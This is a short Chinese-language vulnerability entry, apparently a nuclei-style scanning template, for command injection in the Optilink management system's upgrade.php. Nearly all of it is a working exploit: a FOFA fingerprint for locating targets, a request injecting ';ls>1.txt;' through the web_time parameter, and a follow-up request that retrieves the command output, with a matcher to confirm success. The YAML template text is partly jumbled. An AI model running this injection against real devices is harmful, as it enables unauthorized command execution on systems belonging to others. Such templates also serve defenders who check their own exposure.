# Optilink管理系统upgrade.php任意命令执行漏洞

- **系统**：Optilink　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/html/css/dxtdata.css"`
- **请求**：`GET /cgi/fsystem/upgrade.php?time=1&web_time=;ls>1.txt; HTTP/1.1`
- **关键头**：`id: optilink-upgrade-rce`　`name: Optilink Upgrade RCE`　`author: XA`　`severity: high`　`description: A remote code execution vulnerability in Optilink's upgrade feature.`　`tags: optilink, rce`　`fofa-query: body="/html/css/dxtdata.css"`　`verified: true`

**请求体 / payload**
```
GET /cgi/fsystem/1.txt HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
- raw:
-
Host: {{Hostname}}
-
GET /cgi/fsystem/1.txt HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
matchers:
- type: dsl
dsl:
- status_code_2==200 && contains_all(body, ".php")
```
- **预期**：200　|　—